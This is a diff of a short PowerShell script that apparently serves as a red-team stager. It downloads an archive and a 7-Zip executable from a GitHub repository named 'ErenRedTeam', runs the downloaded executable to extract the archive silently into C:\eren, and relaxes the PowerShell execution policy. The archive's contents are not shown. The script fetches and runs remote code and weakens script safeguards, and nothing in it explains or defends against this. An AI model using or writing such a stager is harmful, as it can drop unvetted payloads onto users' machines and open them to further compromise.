@@ -2,9 +2,11 @@
 
 Get-ChildItem "C:\eren"
 
-Invoke-WebRequest "https://github.com/dheenaxe/ErenRedTeam/raw/refs/heads/main/Cyber.7z" -OutFile "C:\eren\"
+Invoke-WebRequest "https://github.com/dheenaxe/ErenRedTeam/raw/refs/heads/main/Cyber.7z" -OutFile "C:\eren\Cyber.7z"
 
-Start-Process "https://github.com/dheenaxe/ErenRedTeam/raw/refs/heads/main/7zr.exe" -ArgumentList "x", "C:\eren\Cyber.7z", "-oC:\eren\", "-y" -Wait
+Invoke-WebRequest "https://github.com/dheenaxe/ErenRedTeam/raw/refs/heads/main/7zr.exe" -OutFile "C:\eren\7zr.exe"
+
+Start-Process "C:\eren\7zr.exe" -ArgumentList "x", "C:\eren\Cyber.7z", "-oC:\eren\", "-y" -Wait
  
 Set-ExecutionPolicy -ExecutionPolicy RemoteSigned
  
